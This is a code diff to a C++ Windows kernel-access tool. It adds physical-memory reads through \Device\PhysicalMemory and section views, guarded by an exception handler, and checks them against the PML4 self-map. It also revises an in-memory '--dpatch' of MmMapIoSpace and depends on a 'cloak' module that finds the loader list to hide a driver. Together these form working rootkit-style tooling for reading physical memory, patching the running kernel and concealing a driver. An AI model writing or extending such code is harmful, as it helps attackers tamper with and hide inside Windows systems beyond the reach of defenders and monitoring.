@@ -1,6 +1,7 @@
 #include "r0.hpp"
 #include <windows.h>
 #include <winternl.h>
+#include <csetjmp>
 #include "vmm.hpp"          // phys_is_ram guard for the MmMapIoSpace path
 #include "cloak.hpp"        // loader-list locator, primary driver-base source
 #include <cstring>
@@ -226,10 +227,10 @@ void shutdown() {
 bool alive() { return g_be != nullptr; }
 void set_backend(const Backend* be) { g_be = be; }
 
-// Physical reads go ONLY through the driver's MmMapIoSpace IOCTL: it refuses
-// unmappable ranges with a NULL mapping instead of faulting, so a wrong
-// address costs a failed read, never a bugcheck. The RAM guard keeps the walk
-// out of MMIO holes.
+// The MmMapIoSpace IOCTL is a data-page/MMIO backend only. Build 26200 rejects
+// active page-table PFNs for both cached and noncached mappings, so false here
+// can be an expected PT-PFN rejection rather than a missing --dpatch. The RAM
+// guard keeps ordinary walks out of MMIO holes.
 bool pread(uint64_t pa, void* buf, size_t len) {
     if (!g_be) return false;
     if (!len) return true;
@@ -250,6 +251,188 @@ bool pwrite(uint64_t pa, const void* buf, size_t len) {
 bool phys_read_raw(uint64_t pa, void* buf, size_t len) {
     if (!len) return true;
     return do_read(pa, buf, len);
+}
+
+namespace {
+
+using NtOpenSectionFn = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
+using NtMapViewOfSectionFn = NTSTATUS(NTAPI*)(HANDLE, HANDLE, PVOID*, ULONG_PTR,
+    SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
+using NtUnmapViewOfSectionFn = NTSTATUS(NTAPI*)(HANDLE, PVOID);
+
+NtMapViewOfSectionFn nt_map_view = nullptr;
+NtUnmapViewOfSectionFn nt_unmap_view = nullptr;
+__thread volatile DWORD pmem_fault = 0;
+__thread volatile bool pmem_copy_active = false;
+__thread jmp_buf pmem_copy_jmp;
+
+LONG NTAPI pmem_exception_handler(EXCEPTION_POINTERS* ep) {
+    if (!pmem_copy_active || !ep || !ep->ExceptionRecord ||
+        ep->ExceptionRecord->ExceptionCode != EXCEPTION_ACCESS_VIOLATION)
+        return EXCEPTION_CONTINUE_SEARCH;
+    pmem_fault = ep->ExceptionRecord->ExceptionCode;
+    pmem_copy_active = false;
+    longjmp(pmem_copy_jmp, 1);
+}
+
+__attribute__((noinline))
+bool pmem_copy(void* out, const void* in, size_t len) {
+    if (setjmp(pmem_copy_jmp)) return false;
+    pmem_fault = 0;
+    pmem_copy_active = true;
+    asm volatile("" ::: "memory");
+    memcpy(out, in, len);
+    asm volatile("" ::: "memory");
+    pmem_copy_active = false;
+    return true;
+}
+
+bool pmem_view_read(HANDLE section, uint64_t pa, void* out, size_t len) {
+    if (!len || pa + len < pa || (pa & 0xFFFF) + len > 0x10000) return false;
+    PVOID base = nullptr;
+    LARGE_INTEGER offset{};
+    offset.QuadPart = static_cast<LONGLONG>(pa & ~0xFFFFull);
+    SIZE_T view_size = 0x10000;
+    const NTSTATUS st = nt_map_view(section, GetCurrentProcess(), &base, 0, 0,
+                                    &offset, &view_size, 1, 0, PAGE_READONLY);
+    if (st < 0) {
+        printf("[!] NtMapViewOfSection PA 0x%llx failed: NTSTATUS 0x%lx\n",
+               (unsigned long long)(pa & ~0xFFFFull), (unsigned long)st);
+        return false;
+    }
+    PVOID handler = AddVectoredExceptionHandler(1, pmem_exception_handler);
+    bool ok = false;
+    if (handler) {
+        ok = pmem_copy(out, static_cast<const uint8_t*>(base) + (pa & 0xFFFF), len);
+        pmem_copy_active = false;
+        RemoveVectoredExceptionHandler(handler);
+    } else {
+        printf("[!] cannot install the section-view exception guard\n");
+    }
+    const DWORD fault = pmem_fault;
+    const NTSTATUS ust = nt_unmap_view(GetCurrentProcess(), base);
+    if (handler && !ok) printf("[!] section view read PA 0x%llx faulted: 0x%lx\n",
+                               (unsigned long long)pa, (unsigned long)fault);
+    if (ust < 0) {
+        printf("[!] NtUnmapViewOfSection failed: NTSTATUS 0x%lx\n", (unsigned long)ust);
+        return false;
+    }
+    return ok;
+}
+
+bool enable_load_driver_privilege() {
+    HANDLE token = nullptr;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
+        return false;
+    LUID luid{};
+    TOKEN_PRIVILEGES tp{};
+    bool ok = LookupPrivilegeValueW(nullptr, SE_LOAD_DRIVER_NAME, &luid) != 0;
+    if (ok) {
+        tp.PrivilegeCount = 1;
+        tp.Privileges[0].Luid = luid;
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        ok = AdjustTokenPrivileges(token, FALSE, &tp, 0, nullptr, nullptr) != 0;
+    }
+    const DWORD err = GetLastError();
+    CloseHandle(token);
+    if (!ok || err == ERROR_NOT_ALL_ASSIGNED) {
+        printf("[!] SeLoadDriverPrivilege not enabled (error %lu)\n", (unsigned long)err);
+        return false;
+    }
+    return true;
+}
+
+void print_pmem_bytes(const char* tag, uint64_t pa, const uint8_t* b) {
+    printf("[*] pmem 0x%llx (%s): %02x %02x %02x %02x %02x %02x %02x %02x "
+           "%02x %02x %02x %02x %02x %02x %02x %02x\n",
+           (unsigned long long)pa, tag,
+           b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7],
+           b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15]);
+}
+
+} // anonymous namespace
+
+bool pmem_probe() {
+    if (!enable_load_driver_privilege()) return false;
+
+    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+    const auto nt_open = reinterpret_cast<NtOpenSectionFn>(reinterpret_cast<void*>(
+        GetProcAddress(ntdll, "NtOpenSection")));
+    nt_map_view = reinterpret_cast<NtMapViewOfSectionFn>(reinterpret_cast<void*>(
+        GetProcAddress(ntdll, "NtMapViewOfSection")));
+    nt_unmap_view = reinterpret_cast<NtUnmapViewOfSectionFn>(reinterpret_cast<void*>(
+        GetProcAddress(ntdll, "NtUnmapViewOfSection")));
+    if (!nt_open || !nt_map_view || !nt_unmap_view) {
+        printf("[!] PhysicalMemory native entry points not found\n");
+        return false;
+    }
+
+    const wchar_t* path = L"\\Device\\PhysicalMemory";
+    UNICODE_STRING name{};
+    name.Buffer = const_cast<PWSTR>(path);
+    name.Length = name.MaximumLength = static_cast<USHORT>(wcslen(path) * sizeof(wchar_t));
+    OBJECT_ATTRIBUTES oa{};
+    InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
+    HANDLE section = nullptr;
+    const NTSTATUS ost = nt_open(&section, SECTION_MAP_READ | SECTION_QUERY, &oa);
+    if (ost < 0) {
+        printf("[!] NtOpenSection(PhysicalMemory) failed: NTSTATUS 0x%lx%s\n",
+               (unsigned long)ost,
+               ost == static_cast<NTSTATUS>(0xC0000061)
+                   ? " (privilege not held; path closed)"
+                   : ost == static_cast<NTSTATUS>(0xC0000022)
+                       ? " (modern Windows blocks user-mode access; section-view backend unavailable)"
+                       : "");
+        return false;
+    }
+
+    bool ok = false;
+    uint8_t bda[16]{};
+    const bool bda_ok = pmem_view_read(section, 0x400, bda, sizeof(bda));
+    print_pmem_bytes("firmware BDA", 0x400, bda);
+    printf("[%s] BDA section-view read\n", bda_ok ? "+" : "!");
+    if (!bda_ok) {
+        CloseHandle(section);
+        return false;
+    }
+
+    constexpr uint64_t kMask48 = 0x0000FFFFFFFFFFFFull;
+    const uint64_t b = vmm::g_pte_base;
+    const uint64_t pde = b + ((b & kMask48) >> 9);
+    const uint64_t ppe = b + ((pde & kMask48) >> 9);
+    const uint64_t pxe = b + ((ppe & kMask48) >> 9);
+    const uint64_t idx = (b >> 39) & 0x1FF;
+    uint64_t entry{};
+    if (!vread(pxe + idx * 8, &entry, 8) || !(entry & 1)) {
+        printf("[!] current-process PML4 self-map entry unavailable\n");
+        CloseHandle(section);
+        return false;
+    }
+    const uint64_t pml4_pa = entry & vmm::kPteMask;
+    const uint64_t slot_pa = pml4_pa + idx * 8;
+    printf("[*] current-process PML4 PA 0x%llx, self-map slot PA 0x%llx\n",
+           (unsigned long long)pml4_pa, (unsigned long long)slot_pa);
+    if (!vmm::phys_is_ram(pml4_pa, 0x1000)) {
+        printf("[!] PML4 page is outside the RAM map - section view refused\n");
+        CloseHandle(section);
+        return false;
+    }
+
+    uint8_t slot[16]{};
+    const bool slot_ok = pmem_view_read(section, slot_pa, slot, sizeof(slot));
+    print_pmem_bytes("PML4 self-map", slot_pa, slot);
+    uint64_t mapped_entry{};
+    memcpy(&mapped_entry, slot, 8);
+    ok = slot_ok && mapped_entry == entry;
+    if (ok) {
+        printf("[+] PMEM proof: BDA read and PML4 self-map entry matches 0x%llx\n",
+               (unsigned long long)entry);
+    } else if (slot_ok) {
+        printf("[!] PML4 mismatch: section 0x%llx, self-map 0x%llx\n",
+               (unsigned long long)mapped_entry, (unsigned long long)entry);
+    }
+    CloseHandle(section);
+    return ok;
 }
 
 bool vwrite(uint64_t va, const void* buf, size_t len) {
@@ -1130,9 +1313,8 @@ bool patch_cached_map(bool dry_run, const char* step) {
         }
     }
 
-    // Prove it with a real page-table page: the self-map PML4 entry points at
-    // the PML4 page itself, so its PFN is a page-table physical address. Before
-    // the patch MmNonCached refuses that PFN; after the patch it must read.
+    // Record the expected 26200 limitation without turning it into a patch
+    // failure: both cache types reject active page-table PFNs in MiFillSystemPtes.
     uint64_t pml4_pa = 0;
     if (vmm::g_pte_base) {
         constexpr uint64_t kMask48 = 0x0000FFFFFFFFFFFFull;
@@ -1149,12 +1331,11 @@ bool patch_cached_map(bool dry_run, const char* step) {
         }
     }
 
-    struct T { uint64_t pa; const char* tag; bool must; };
+    struct T { uint64_t pa; const char* tag; };
     const T tests[] = {
-        { pml4_pa,  "PML4 page",   pml4_pa != 0 },
-        { 0x400,    "firmware BDA", false },
+        { pml4_pa,  "PML4 page" },
+        { 0x400,    "firmware BDA" },
     };
-    bool all = true;
     for (const T& tc : tests) {
         uint8_t b[16]{};
         const bool in_ram = tc.pa && vmm::phys_is_ram(tc.pa, sizeof(b));
@@ -1165,14 +1346,11 @@ bool patch_cached_map(bool dry_run, const char* step) {
                (unsigned long long)tc.pa, tc.tag, ok ? "OK" : "FAIL",
                in_ram ? "yes" : "no", (unsigned long)err,
                b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]);
-        if (tc.must && !ok) all = false;
     }
-    if (!all) {
-        printf("[!] page-table physical reads still fail after the patch\n");
-        return false;
-    }
-    if (pml4_pa) printf("[+] G4 runtime proof: patched MmMapIoSpace read the PML4 page "
-                        "(PA 0x%llx)\n", (unsigned long long)pml4_pa);
+    printf("[+] patch applied; page-table PFNs remain unsupported by MmMapIoSpace "
+           "(expected on 26200)\n");
+    printf("[*] physical IOCTL is now a data-page/MMIO backend only - "
+           "PT reads need the section view\n");
     printf("[*] patch is memory-only: re-run --dpatch on every boot, before --cloak\n");
     return true;
 }
